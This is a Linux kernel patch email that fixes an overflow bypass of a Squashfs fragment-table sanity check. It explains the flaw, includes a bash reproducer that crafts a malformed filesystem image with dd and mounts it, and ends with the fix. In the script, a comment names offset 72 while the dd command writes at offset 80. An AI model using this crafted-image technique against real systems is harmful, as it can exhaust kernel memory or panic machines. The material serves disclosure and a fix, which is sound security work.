Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=188.121.53.101
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794029375;
	b=FhMaP2SNLsPmUs19kzOyaLTqrMo6hb17XlmBn6+PztRcJK63R5P7tiPZT0i60pWUsoRf
	 jHu5nXiuw4vXNZkac7v5xm5x+w/HyocUjg9j0uqRhzS1daMs4tbfJKOPtdLkW4rIZeSJf
	 /OHviG3Asjf7UDmTfCdLCA0kJ8qufqUM3ppUSwaQW4r/H+A7BJklzRnKuxzi83JkEGnKu
	 UVi8Qw/gqCeV6FH3bJlS/5ebB0CKixqYCf7FPgytQ7qELVc8X1HZ9VTnwLLBzo5AzjDhZ
	 /96+HKAYQPuiZsaqEssrTAa1/t/3elJsKYVjXeX3/BW+Xqgibmi9ppji5J7sDikuDtw==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794029375;
	h=DMARC-Filter:Received:DKIM-Signature:DKIM-Signature:X-CMAE-Analysis:
	 Feedback-ID:X-SECURESERVER-ACCT:From:To:Cc:Subject:Date:Message-ID:
	 X-Mailer:In-Reply-To:References:MIME-Version:
	 Content-Transfer-Encoding:X-CMAE-Envelope;
	bh=r9eLjveMin1D2ZLNPwxfKt5MBfGoC53sknDXJOavBvI=;
	b=JMEviLkOAHU8dRNjz2cgacfWgiZkP32P1ydcR0dfkwtbNiOmCWDPWezAWhXmXFDaPVPN
	 XGhz1v+3Mb7DJwi94EjetTQOsmLHADMOIBz8hhhG1WxGHSVzAO5nNPuEUkI75ZeeUlMjb
	 XIx/m7JRGW9Y2N8128o8lcpiH4vqpWwjR2DFGbUqBFDHw3W9EOmUN2N8S17kodgZWSatv
	 N8euS9LqJFOVI8lp+fLHe3KOjgWaln0KH2vX8PhUkAhc3Zwmhs2/Xo/jLv/UxcVS6/NS8
	 CudNLgV1DqeEWjXukc3aEhKLdmXUENDXTG1WQBdPnBqTq4Bl2FHFUSPthHue9e3xsOw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=squashfs.org.uk;
	spf=pass smtp.mailfrom=squashfs.org.uk;
	dkim=pass header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=OVGVSF5h;
	dkim=pass header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=G8suqp84;
	arc=none smtp.remote-ip=188.121.53.101
Received: from sxplsmtpa04-10.prod.sxb1.secureserver.net (sxplsmtpa04-10.prod.sxb1.secureserver.net [188.121.53.101])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8C2FC606A335
	for <linux-kernel@vger.kernel.org>; Sat,  7 Nov 2026 05:29:34 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 8C2FC606A335
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=OVGVSF5h;
	dkim=pass (2048-bit key, unprotected) header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=G8suqp84
Received: from avalon.fritz.box ([82.69.79.175])
	by :SMTPAUTH: with ESMTPA
	id PYyzxFofBjLMrPYzPx4crh; Sat, 07 Nov 2026 05:29:20 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=secureserver.net;
	s=secureserver2; t=1794029361;
	bh=r9eLjveMin1D2ZLNPwxfKt5MBfGoC53sknDXJOavBvI=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=OVGVSF5hSJokNgGatfVXMUrTlXQKoDOXeyW1C4FV7jAHgxMyrRJEkB771ReXGmVdz
	 P94tz/UQ1v3wXfHMGx3qzeihNWMzl/th+E1Vif+UsS4RJMh8/80L+vdaSTosIJZMiu
	 t9VF0l/Es0LxIhdqYv58EZD2Vy7N4Y1P5d23fZwBnRNDBKMq6dllJL2xgjRR9hc3Y1
	 CIRGoteMEhQ5HLkk1uqAZJUrCIOAA/KxDnGiqitq/wsi0jQjejklW34Zki0dvHsyRU
	 FTeNvpXs9+mDFFq20zqvRgf255tQnv1E9PpAClMZljXQtlaNzbBG8XtLMohHNf9zxP
	 TJO29bVP5gEEw==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=squashfs.org.uk;
	s=secureserver1; t=1794029361;
	bh=r9eLjveMin1D2ZLNPwxfKt5MBfGoC53sknDXJOavBvI=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=G8suqp841Ob4YVznSIP1/9agHnXrduSXGC8C6F+AIXRzrnRjSUA3+Hlg5MJlHGSw0
	 r4Cqv2ZCiiHzVuCR4YGL6nK9S/Sdmp1w7Y2uded0/KzgQdfyuwjXpc3uGKH18Y8Wlv
	 UXCH4S7ZMDBZ70ahf45oiYoRvVuAMj5CX4zan3SO45oGxQSo0micV20wtbl1Eiwfl5
	 t3UcOgOebWEuvVsgKIPz4KEYfbrg2ESMOS9+oBi9U67alY/9r8eSDkXNFUHicP8OXO
	 HWy584SWwxkd49JGU/0V/Q0Z7Gy8KuoUHWNYW0gx5qAZ4+7NBkPp+zqxQNYnWONsea
	 nXKaG0Z8m8PdA==
X-CMAE-Analysis: v=2.4 cv=fZ84WEQF c=1 sm=1 tr=0 ts=6aeeb730
 a=84ok6UeoqCVsigPHarzEiQ==:117 a=84ok6UeoqCVsigPHarzEiQ==:17 a=FXvPX3liAAAA:8
 a=5M4-1oPrCebqpQMMblwA:9 a=UObqyxdv-6Yh2QiB9mM_:22
Feedback-ID: d79905dd3c9092cfa5e4fd66f17d8475:squashfs.org.uk:ssnet
X-SECURESERVER-ACCT: phillip@squashfs.org.uk
From: Phillip Lougher <phillip@squashfs.org.uk>
To: akpm@linux-foundation.org,
	linux-kernel@vger.kernel.org
Cc: Phillip Lougher <phillip@squashfs.org.uk>
Subject: [PATCH 08/18] Squashfs: fix fragment index table length too large exploit
Date: Sat,  7 Nov 2026 05:28:33 +0000
Message-ID: <20261107052843.725239-9-phillip@squashfs.org.uk>
X-Mailer: git-send-email 2.47.3
In-Reply-To: <20261107052843.725239-1-phillip@squashfs.org.uk>
References: <20261107052843.725239-1-phillip@squashfs.org.uk>
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Post: <mailto:linux-kernel@vger.kernel.org>
List-Help: <mailto:linux-kernel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CMAE-Envelope: MS4xfKNhh/klQYBJnrGVL5cZNHA+UNlT2ri54i5hEh5/odP+a1Pm3tnDBeOVGedVMcP+LZTqSnZSajXnSE0SuanmSKi4i8S13JKmDAvU++c2DpF2sG1ffbZW
 kEfGkOdcLCOYi9FbmBcwi2nZV8/mO461LEbtBxE96smZLOPTWLAvEZ7chGn7Zs0jJAVTmItQVTjgfDQF2HhNT9MSi3xgFcy7zSsdMkLc4arEBZ0/G3ebKPeR
 9lm2Ng4IyOcJmqDH6GzF5QKGKUybuDpeiAxGW8FumVkHUnAecDDhX6pSgAwY4X7K

An attacker can manipulate the fragment count and the fragment table
start values in the superblock, and force the code to kmalloc()
a 4 Mbyte memory region, or try to allocate larger values which
will fail with a warning, and which will panic the kernel if panic on
warn is set.

If the allocation succeeds, these invalid values will be caught when the
code tries to read the data from disk, but, this leaves a small time
window where the 4 Mbyte block is allocated before being freed when
the mount of the filesystem fails.

The exploit relies on arithmetic overflow to evade the following sanity
check:

	if (fragment_table_start + length > next_table)

Specifically, the values of fragment_table_start and length can be
chosen so that they overflow an unsigned long long, and so appear less
than next_table.

Typically, the maximum memory that can be allocated with kmalloc() is
4 Mbytes.  So if length is 4 Mbytes, this means fragment_table_start
needs to be 2^64 - 4 Mbytes, to achieve overflow and produce a zero
length.

This value is beyond the end of any block device, because the maximum
block device is 2^63 - 512 in size (LLONG_MAX >> 9 sectors of 512
bytes).

In practice this means such a large value will be caught when the code
immediately after allocation tries to read the data off disk:

 	table = squashfs_read_table(sb, fragment_table_start, length);

However, the code should check for validity before allocating a large
kmalloc() area, because such allocations can cause memory pressure or
cause the kernel to panic.

This commit checks that fragment_tables_size is not too large, and
ensures arithmetic overflow does not occur.

It also makes the sanity check more exacting by utilising the fact that
there should be zero gap between the end of the fragment index table and
the next table.

Reproducer
=========

The following script if the eploit works, will fail with the mount
error

mount: attempt to access beyond end of device

=================================================================
#!/bin/bash

ARGS="-quiet -no-progress"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

# Create a Squashfs filesystem with a single file.
#
DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

echo Create the Squashfs filesystem

if ! mksquashfs - img.sqsh -p "/ d 0777 0 0" -p "/file f 0777 0 0 echo hello" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish

fi

# The fragments field (fragment count) in the superblock is at offset
# 16 bytes.
#
# Over-write the fragments count with 268,435,456 little-endian.
# This will make the kernel try to kmalloc() 4 Mbytes to hold the
# fragment index table.
#

# Write 268,435,456 in little-endian format to file
/usr/bin/echo -en "\x00\x00\x00\x10" > file

# Over-write the fragments count in the superblock
echo Over-write the fragments count in the superblock

dd bs=1 seek=16 if=file of=img.sqsh count=4 conv=notrunc status=none

# The fragment table start (start of the index table) in the superblock
# is at offset 72 bytes.
#
# Over-write the value with 2^64 - 4 Mbytes little-endian.
# This value with the index table length will overflow an unsigned
# long long, giving the value 0.  This will evade the sanity check.

# Write 2^64 - 4 Mbytes in little-endian format to file
/usr/bin/echo -en "\x00\x00\xc0\xff\xff\xff\xff\xff" > file

# Over-write the fragment table start in the superblock
echo Over-write the fragment table start in the superblock

dd bs=1 seek=80 if=file of=img.sqsh count=8 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

# If the eploit works, the mount will fail with
# mount: attempt to access beyond end of device

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

popd 2>&1 > /dev/null

rm -rf $DIR
=================================================================

Fixes: 1cac63cc9b2f ("Squashfs: add sanity checks to fragment reading at mount time")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
---
 fs/squashfs/fragment.c | 8 ++++----
 1 file changed, 4 insertions(+), 4 deletions(-)

diff --git a/fs/squashfs/fragment.c b/fs/squashfs/fragment.c
index e945d045d55e..9f63e5b5c513 100644
--- a/fs/squashfs/fragment.c
+++ b/fs/squashfs/fragment.c
@@ -68,11 +68,11 @@ __le64 *squashfs_read_fragment_index_table(struct super_block *sb,
 	__le64 *table;
 
 	/*
-	 * Sanity check, length bytes should not extend into the next table -
-	 * this check also traps instances where fragment_table_start is
-	 * incorrectly larger than the next table start
+	 * The computed size of the index table (length bytes) should exactly
+	 * match the table start and end points
 	 */
-	if (fragment_table_start + length > next_table)
+	if (fragment_table_start >= next_table ||
+				length != (next_table - fragment_table_start))
 		return ERR_PTR(-EINVAL);
 
 	table = squashfs_read_table(sb, fragment_table_start, length);
-- 
2.47.3

